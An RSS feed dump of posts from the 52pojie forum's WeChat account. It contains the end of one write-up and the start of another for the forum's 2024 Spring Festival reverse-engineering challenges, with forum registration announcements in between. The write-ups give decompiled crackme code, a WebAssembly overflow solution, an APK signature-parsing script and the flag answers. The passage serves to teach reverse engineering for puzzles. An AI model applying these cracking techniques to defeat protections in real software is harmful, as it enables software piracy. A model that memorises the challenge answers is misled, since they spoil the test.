src="https://https://wechat2rss.xlab.app/img-proxy/?k=6dbb2cc3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKcv1JsDwaZE0RiaHa6ZU0LiaXXZnDMtb696fBCjeWxhON6O0680c9YjZg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>发现这个问题以后，直接用curl命令下载图片<code style="font-family: SFMono-Regular, Consolas, ;">curl -l https://2024challenge.52pojie.cn/flag4_flag10.png -o ./flag4_flag10.png</code></p><p>接下来就简单了，用stegsolve工具中的Analyse-Stereogram Solver（立体视图）工具，设置偏移量为1或2即可看到隐藏的flag10</p><p>上图是curl下载图片（含隐写信息）；下图是edge下载图片（无隐写信息）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=8a0e241c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKibUvZ5hJVS2VU1dtQDOic68rhWN0GQ4CV73BjwCcOXL5ViaJiaXAj4XktA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /><br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=56ec2049&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK2tDAHWXw2ycsmbnof7jS3O91BAibAx4gVicg727De3Mjf3gM5Vh9NnLQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag10{6BxMkW}</span></p></blockquote><h3>Flag11</h3><p>拼图游戏，修改html:root中的css属性<code style="font-family: SFMono-Regular, Consolas, ;">--var1</code>和<code style="font-family: SFMono-Regular, Consolas, ;">--var2</code>，复原图片即可【两个变量的值分别为71和20】<br />（小技巧，使用鼠标滚轮滚动参数，使图片块往聚合方向运动就没啥问题了）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=af6b8ec6&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKp4KgxQlNWKQmM7ibwCMIpzQfmQQibRYTUANCC5qGIsxI9YCIKDJOVqRg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag11{HPQfVF}</span></p></blockquote><h3>Flag12</h3><p>WebAssembly（Wasm）技术，直接看关键部分</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"> (func $<span style="color: rgb(255, 255, 182);">get_flag12</span> (;<span style="color: rgb(255, 115, 253);">0</span>;) (export <span style="color: rgb(168, 255, 96);">"get_flag12"</span>) (param $var0 <span style="color: rgb(255, 255, 182);">i32</span>) (result <span style="color: rgb(255, 255, 182);">i32</span>)<br />    <span style="color: rgb(255, 255, 182);">i32</span>.<span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 115, 253);">1213159497</span><br />    <span style="color: rgb(255, 255, 182);">i32</span>.<span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 115, 253);">0</span><br />    local.get $var0<br />    <span style="color: rgb(255, 255, 182);">i32</span>.<span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 115, 253);">1103515245</span><br />    <span style="color: rgb(255, 255, 182);">i32</span>.mul<br />    <span style="color: rgb(255, 255, 182);">i32</span>.<span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 115, 253);">1</span><br />    <span style="color: rgb(255, 255, 182);">i32</span>.eq<br />    select<br />  )</code></pre><p>用chatgpt解释一下代码：<br />这段WebAssembly（Wasm）代码定义了一个名为get_flag12的函数，该函数接受一个32位整数作为参数$var0，并返回一个32位整数作为结果。这个函数的作用是检查传入的参数是否与特定值相关联，如果是则返回1，否则返回0。<br />具体而言，代码执行以下步骤：</p><ol><li style="margin-left: 2px;"><p>i32.const 1213159497：将值1213159497（0x483CEEE9）压入堆栈。</p></li><li style="margin-left: 2px;"><p>i32.const 0：将值0压入堆栈。</p></li><li style="margin-left: 2px;"><p>local.get \$var0：将函数参数\$var0的值压入堆栈。</p></li><li style="margin-left: 2px;"><p>i32.const 1103515245：将值1103515245（0x41C64E6D）压入堆栈。</p></li><li style="margin-left: 2px;"><p>i32.mul：将栈顶两个值相乘。</p></li><li style="margin-left: 2px;"><p>i32.const 1：将值1压入堆栈。</p></li><li style="margin-left: 2px;"><p>i32.eq：比较栈顶两个值是否相等，如果相等则将1压入堆栈，否则将0压入堆栈。</p></li><li style="margin-left: 2px;"><p>select：根据栈顶的布尔值选择两个值中的一个放回栈顶。</p></li></ol><p>因此，这段代码的主要目的是将参数$var0与特定的数值进行处理，并根据结果返回1或0。</p><p>又是溢出问题，即1103515245*<code style="font-family: SFMono-Regular, Consolas, ;">输入值</code> = 1，那么这个输入值一定很大（超出上限），<br />这边提到了i32，即32位整型数据，最大值为2^31-1 = 2147483647<br />写个C语言程序跑一下</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;bits/stdc++.h&gt;</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;iostream&gt;</span></span><br /><span style="color: rgb(150, 203, 254);">using</span> <span style="color: rgb(150, 203, 254);">namespace</span> std;<br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>()<br />{<br />    <span style="color: rgb(150, 203, 254);">for</span>(<span style="color: rgb(255, 255, 182);">long</span> j = <span style="color: rgb(255, 115, 253);">0</span>; j&lt;= <span style="color: rgb(255, 115, 253);">4294967295</span>; j++){<br />        <span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">1103515245</span>;<br />        <span style="color: rgb(150, 203, 254);">if</span>(i*j == <span style="color: rgb(255, 115, 253);">1</span>) {<br />            cout&lt;&lt;j&lt;&lt;endl;<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>嗯？结果跑出来个负数？不管了，填进去。</p><blockquote><p style="margin-bottom: 15px;">-289805467</p></blockquote><p>这也能出答案是我没想到的......看来是满足条件就能出......<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a342e295&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKdkdDRMibcUh4Am0XkJyOiaia4gXynDVsIL6SnIEfseicPjSb7T2HfK5lnA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flag12{HOXI}</span></p></blockquote><h3>FlagC</h3><p>好家伙，直接内嵌TF.js跑Yolo目标检测模型了（不过看起来好像是yolov5n，没上v8不是很认可【doge】）......<br />当小游戏直接玩吧，它都直接告诉你那些正确了，调整一下位置即可。<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5f3f3476&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKzx4zMFvqhXxqwTKTlcmG4qBOh38VSUjqk8oaw8kiaANMe5HicrlRJAtQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>我搭出的阵：<br /><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=9ba37440&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKKNOxAAGN5mf6qzPApUr6icHaCJUeC0K0xEQDufSp6JrKLE1PIvsFqTw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>下面来简单看一下这个网页的逻辑：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/flagC/verify'</span>, {<br />                        method: <span style="color: rgb(168, 255, 96);">'POST'</span>,<br />                        headers: {<br />                            <span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/json'</span>,<br />                        },<br />                        body: <span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">stringify</span>({<br />                            boxes,<br />                            scores,<br />                            classes,<br />                        }),<br />                        credentials: <span style="color: rgb(168, 255, 96);">"include"</span>,<br />                    }).<span style="color: rgb(255, 255, 182);">then</span>((res) =&gt; res.<span style="color: rgb(255, 255, 182);">json</span>()).<span style="color: rgb(255, 255, 182);">then</span>((res) =&gt; {<br />                        <span style="color: rgb(150, 203, 254);">const</span> {hint, labels, colors} = res;<br />                        <span style="color: rgb(198, 197, 254);">document</span>.<span style="color: rgb(255, 255, 182);">querySelector</span>(<span style="color: rgb(168, 255, 96);">'#result'</span>).textContent = hint; <span style="color: rgb(124, 124, 124);">// 错误时显示提示，正确时显示 flag</span><br />                    })</code></pre><p>简而言之就是调用TF.js(Tensorflow，Google开发的一款深度学习框架)加载yolo目标检测模型，对上传的图片执行本地目标检测<br />然后将检测结果（boxes-&gt;【目标框】，scores【置信度】，classes【分类标签】）以POST形式传递至后端，接受后端返回的提示，并在图中框出来</p><p>emmm，这个玩玩就好了，修改也没啥意思，因为判断逻辑在后端，程序能帮你做的也只能是根据提示不断修改，意义不大（doge）</p><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">flagC{ce92f978} 过期时间: 2024-02-18 10:10:00</span></p></blockquote><p style="margin-bottom: 0px; margin-top: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1888883-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Fri, 15 Mar 2024 17:26:51 +0800</pubDate>
<pubDate>Fri, 15 Mar 2024 17:26:51 +0800</pubDate>
</item>
<item>
<title>十六周年开放注册四小时共注册46677人，没有激活的同学请尽快激活啦，发帖前请认真阅读注册须知和总版规，防止违规封号注销。

刚加入的同学请经常登录并保持活跃（注意：签到不算活跃，只有发帖或回帖才算，这句话很重要），参与到论坛交流中来，对于给予帮助你的人加热心和论坛币，做一个热心受欢迎的人。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140216&amp;idx=1&amp;sn=db8ffb124fb2682de404536278f8893f&amp;chksm=bd50a02c8a27293aca1512867952c33deb7f219c6bff8ba7901380813a8c9686c655d7c1448d&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140216&amp;idx=1&amp;sn=db8ffb124fb2682de404536278f8893f&amp;chksm=bd50a02c8a27293aca1512867952c33deb7f219c6bff8ba7901380813a8c9686c655d7c1448d&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> ❶ 事件名称：吾爱破解网站发布2024年03月14日的消息
<br>
❷ 发布时间：11:19
<br>
❸ 发布地点：北京
<br> <div>
<p>
<span>吾爱pojie</span> <span>2024-03-14 11:19</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        
                      </div>
]]></content:encoded>
<pubDate>Thu, 14 Mar 2024 11:19:20 +0800</pubDate>
<pubDate>Thu, 14 Mar 2024 11:19:20 +0800</pubDate>
</item>
<item>
<title>【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告即将开始 12：00 -- 14：00 和 20：00 -- 22：00。

赶不上的定个晚间闹钟吧，新通知会在B站继续发布。

推荐使用电脑注册，可以使用论坛的诊断修复工具修复一次，方便提前解决注册中可能会遇到的问题，如果修复后还是不行建议尽快更换设备尝试。

注册页面会强制10分钟来阅读注册须知，须知中包括了你注册现在和未来可能会遇到的问题，请仔细阅读，否则可能无法注册成功或注册后被清理。

开放注册期间暂停签到任务、QQ登录绑定、下载论坛附件功能、默认搜索功能等功能请各位知晓，在论坛等待大家光临。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140214&amp;idx=1&amp;sn=7c3de58302fc3da5d1dfb436567717fd&amp;chksm=bd50a0228a272934d1a98f07c75ce86f7f689b1060f1b4f1faf47cdc16b50488f7bb3bdcab62&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140214&amp;idx=1&amp;sn=7c3de58302fc3da5d1dfb436567717fd&amp;chksm=bd50a0228a272934d1a98f07c75ce86f7f689b1060f1b4f1faf47cdc16b50488f7bb3bdcab62&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> 📅 2024年3月13日  
🕚 11:15  
📍 北京  

1. 2024年3月13日上午11:15，这则新闻发生在北京。<br>

2. 请注意，这是中国当地时间，可能与您所在地的时间存在差异。<br> <div>
<p>
<span></span> <span>2024-03-13 11:15</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        <a></a><a></a>
                      </div>
]]></content:encoded>
<pubDate>Wed, 13 Mar 2024 11:14:42 +0800</pubDate>
<pubDate>Wed, 13 Mar 2024 11:14:42 +0800</pubDate>
</item>
<item>
<title>十六周年开放注册微信抽奖活动，再送40个账号注册码或300论坛币，下午两点开奖，详见【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告。

注：中奖后务必今天领奖，延期无效。

另：明天开放注册期间暂停签到任务、下载论坛附件功能、默认搜索功能、QQ登录绑定等功能（忘记账号密码可以邮箱重置后登陆）请各位知晓。主要把下载附件的带宽和服务器负载节省下来供用户注册访问使用，等注册结束就恢复了（默认搜索功能根据论坛负载压力预计一周左右恢复），请大家谅解。另外新注册的会员需要注册一天后才可以发帖，以缓解注册压力。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140212&amp;idx=1&amp;sn=c631371d786bc30870b342f907df53a3&amp;chksm=bd50a0208a272936dd6fa90d4b999df2f75aa3fca0cddfd18c969d530cf8679518b39335d5c1&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140212&amp;idx=1&amp;sn=c631371d786bc30870b342f907df53a3&amp;chksm=bd50a0208a272936dd6fa90d4b999df2f75aa3fca0cddfd18c969d530cf8679518b39335d5c1&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
<span></span> <span>2024-03-12 10:25</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        <a></a>
                      </div>
]]></content:encoded>
<pubDate>Tue, 12 Mar 2024 10:25:40 +0800</pubDate>
<pubDate>Tue, 12 Mar 2024 10:25:40 +0800</pubDate>
</item>
<item>
<title>吾爱破解 2024 春节红包活动WP(全，含 Android 高级题)</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140210&amp;idx=1&amp;sn=0f3c8d79d823ad6dfd30b95fbd11be9b&amp;chksm=bd50a0268a272930a694d989c02d58121311eabfddd56f63bd7be73ea316efa76872584c1bd2&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140210&amp;idx=1&amp;sn=0f3c8d79d823ad6dfd30b95fbd11be9b&amp;chksm=bd50a0268a272930a694d989c02d58121311eabfddd56f63bd7be73ea316efa76872584c1bd2&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
原创 <span>吾爱pojie</span> <span>2024-03-11 12:18</span> <span style="display: inline-block;">北京</span>
</p>

<p>来自解题领红包全能榜唯一一名选手的​解题分享。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=722a6273&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJRX82Zg6HXlBWDkNDBpCfHaSxr0m1c4kwbej16Q5yUiaxHiaajYiaWg3udxxZJDzCSowyn9icicRu0mrA%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>4qwerty7</strong></p><p style="text-align: start; line-height: normal; margin-bottom: 0px;"><span style="color: #0000ff; font-family: Segoe UI, Tahoma, Hiragino Sans GB, Microsoft Yahei, Simsun;"><span style="font-size: 20px; letter-spacing: 0.544px; background-color: rgb(255, 255, 255);"><strong>来自解题领红包全能榜唯一一名选手的解题分享。</strong></span></span></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><h2>送分题</h2><p>公众号发送提示内容即可。</p><h2>Windows 初级题</h2><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">int __cdecl main(int argc, const char **argv, const char **envp)<br />{<br />// definations<br />  Src[4] = 0;<br />  v30 = 15;<br />  LOBYTE(Src[0]) = 0;<br />  sub_B42560(Src, <span style="color: rgb(168, 255, 96);">"ioCj~KCss|bQ6zbhCu$5r57$Iljkwlqj$$$?"</span>, 0x24u);<br />  v36 = 0;<br />  SetConsoleTitleA(&amp;ConsoleTitle);<br />  v34 = 0;<br />  v35 = 15;<br />  LOBYTE(v33[0]) = 0;<br />  LOBYTE(v36) = 1;<br />  v4 = sub_B427D0(v3, <span style="color: rgb(168, 255, 96);">"Please input password: "</span>);<br />  sub_B42A80((int)v4);<br />  sub_B431E0(&amp;dword_B6E088, v33);<br />  v6 = v35;<br />  v7 = (void **)v33[0];<br />  if ( v34 == 36 ) // check length<br />  {<br />    sub_B42490(&amp;v27, Src);<br />    sub_B41FE0((int)Block, -3, v27, v28);<br />    LOBYTE(v36) = 2;<br />    v9 = Block;<br />    v10 = v33;<br />    if ( v32 &gt;= 0x10 )<br />      v9 = (void **)Block[0];<br />    if ( v6 &gt;= 0x10 )<br />      v10 = v7;<br />    if ( Block[4] != (void *)36 )<br />      goto LABEL_19;<br />    v11 = 32;<br />    while ( 1 ) // compare<br />    {<br />      v12 = *v10;<br />      if ( *v10 != *v9 )<br />        break;<br />      ++v10;<br />      ++v9;<br />      v14 = v11 &lt; 4;<br />      v11 -= 4;<br />      if ( v14 )<br />      {<br />        v13 = 0;<br />        goto LABEL_18;<br />      }<br />    }<br />    v14 = (unsigned __int8)v12 &lt; *(_BYTE *)v9;<br />    if ( (_BYTE)v12 == *(_BYTE *)v9<br />      &amp;&amp; (v15 = *((_BYTE *)v10 + 1), v14 = v15 &lt; *((_BYTE *)v9 + 1), v15 == *((_BYTE *)v9 + 1))<br />      &amp;&amp; (v16 = *((_BYTE *)v10 + 2), v14 = v16 &lt; *((_BYTE *)v9 + 2), v16 == *((_BYTE *)v9 + 2))<br />      &amp;&amp; (v17 = *((_BYTE *)v10 + 3), v14 = v17 &lt; *((_BYTE *)v9 + 3), v17 == *((_BYTE *)v9 + 3)) )<br />    {<br />      v13 = 0;<br />    }<br />    else<br />    {<br />      v13 = v14 ? -1<span style="color: rgb(150, 203, 254);"> :</span> 1;<br />    }<br />LABEL_18:<br />    v18 = <span style="color: rgb(168, 255, 96);">"Success"</span>;<br />    if ( v13 )<br />LABEL_19:<br />      v18 = <span style="color: rgb(168, 255, 96);">"Wrong,please try again."</span>;<br />    v19 = sub_B427D0((int)v9, v18);<br />// end logic<br />  return 0;<br />}</code></pre><p>输入一个长度为 36 的串，在开始比较处下断点，发现比较的是用户输入和flag，提交flag即可。</p><p><code style="font-family: SFMono-Regular, Consolas, ;">fl@g{H@ppy_N3w_e@r!2o24!Fighting!!!}</code></p><p>1.1版本多了个!，会有个 jumpout，这是因为IDA把它识别成了两个函数，需要 undefine 第二个函数，并把相关代码识别到第一个函数里面：</p><p><code style="font-family: SFMono-Regular, Consolas, ;">fl@g{H@ppy_N3w_e@r!2o24!Fighting!!!!}</code></p><h2>Android 初级题一</h2><p>jadx 打开，阅读 MainActivity 和 YSQDActivity 代码发现 flag 位于 ys.mp4 末尾，内容为 <code style="font-family: SFMono-Regular, Consolas, ;">flag{happy_new_year_2024}</code>。</p><h2>Android 初级题二</h2><p>jadx 打开，阅读 FlagActivity 代码发现 flag 是数组 <code style="font-family: SFMono-Regular, Consolas, ;">{86, -18, 98, 103, 75, -73, 51, -104, 104, 94, 73, 81, 125, 118, 112, 100, -29, 63, -33, -110, 108, 115, 51, 59, 55, 52, 77}</code> 与 apk 证书二进制内容的异或。</p><p>编写得到证书的脚本</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> struct<br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_v2_signature</span>(path, verbose=<span style="color: rgb(198, 197, 254);">True</span>):<br />    buf = open(path, <span style="color: rgb(168, 255, 96);">'rb'</span>).read()<br />    off = <span style="color: rgb(255, 115, 253);">0</span><br />    i = <span style="color: rgb(255, 115, 253);">0</span><br />    <span style="color: rgb(124, 124, 124);"># find zip's EOCD</span><br />    <span style="color: rgb(150, 203, 254);">while</span> <span style="color: rgb(198, 197, 254);">True</span>:<br />        off = len(buf) - i - <span style="color: rgb(255, 115, 253);">2</span><br />        n, = struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;H'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">2</span>])<br />        <span style="color: rgb(150, 203, 254);">if</span> n == i:<br />            off -= <span style="color: rgb(255, 115, 253);">20</span><br />            <span style="color: rgb(150, 203, 254);">if</span> (struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">4</span>])[<span style="color: rgb(255, 115, 253);">0</span>] ^ <span style="color: rgb(255, 115, 253);">0xcafebabe</span>) == <span style="color: rgb(255, 115, 253);">0xccfbf1ee</span>:<br />                <span style="color: rgb(150, 203, 254);">break</span><br />        <span style="color: rgb(150, 203, 254);">assert</span> i &lt; <span style="color: rgb(255, 115, 253);">0xffff</span>, <span style="color: rgb(168, 255, 96);">'cannot find eocd'</span><br />        i += <span style="color: rgb(255, 115, 253);">1</span><br />    off += <span style="color: rgb(255, 115, 253);">16</span><br />    offset, = struct.unpack(<span style="color: rgb(168, 255, 96);">'&lt;I'</span>, buf[off:off+<span style="color: rgb(255, 115, 253);">4</span>])<br />    off = offset - <span style="color: rgb(255, 115, 253);">0x18</span><br />    <span style="color: rgb(124, 124, 124);"># apk sig block is before the central directory starts</span><br />    sig_block_size, = 